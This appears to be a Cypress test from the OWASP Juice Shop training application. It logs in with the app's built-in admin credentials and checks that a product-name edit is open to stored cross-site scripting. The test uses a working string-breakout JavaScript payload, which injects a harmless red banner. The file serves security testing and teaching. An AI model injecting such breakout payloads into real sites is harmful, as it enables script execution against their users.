/*
 * Copyright (c) 2014-2025 Bjoern Kimminich & the OWASP Juice Shop contributors.
 * SPDX-License-Identifier: MIT
 */

describe('Product Edit (Stored XSS via Script Injection)', () => {
  // This payload breaks out of the string literal and injects the banner creation code.
  const xssPayload = `');var s=document.createElement('style');s.innerHTML='@keyframes f{0%{background:crimson}50%{background:#ff4757}100%{background:crimson}}';document.head.appendChild(s);var b=document.createElement('div');b.id='xss-banner';b.innerHTML='This page is vulnerable to XSS';b.style='position:fixed;bottom:0;left:0;width:100%;padding:1em;color:white;text-align:center;font-size:1.5em;font-weight:bold;z-index:9999;animation:f 2s infinite';document.body.appendChild(b);//`;

  beforeEach(() => {
    cy.login({ email: 'admin@juice-sh.op', password: 'admin123' });
  });

  it('should allow a user to edit a product name and trigger a stored XSS vulnerability', () => {
    cy.visit('/#/search');

    // Close the welcome banner if it appears
    cy.get('body').then(($body) => {
      if ($body.find('[aria-label="Close Welcome Banner"]').length > 0) {
        cy.get('[aria-label="Close Welcome Banner"]').click();
      }
    });

    // Click the first product on the page to open the details dialog
    cy.get('.product').first().click();
    cy.get('mat-dialog-content').should('be.visible');

    // Click the edit button
    cy.get('app-product-details').find('button[aria-label="Suggest an edit for this product"]').click();

    // Enter the XSS payload
    cy.get('app-product-details').find('input[aria-label="Product name edit input"]').clear().type(xssPayload, { parseSpecialCharSequences: false });

    // Save the malicious name
    cy.get('app-product-details').find('button[aria-label="Save your suggestion"]').click();

    // Assert that the XSS banner is now visible
    cy.get('#xss-banner').should('be.visible');

    // Wait for a few seconds to ensure the video captures the banner
    cy.wait(3000);
  });
});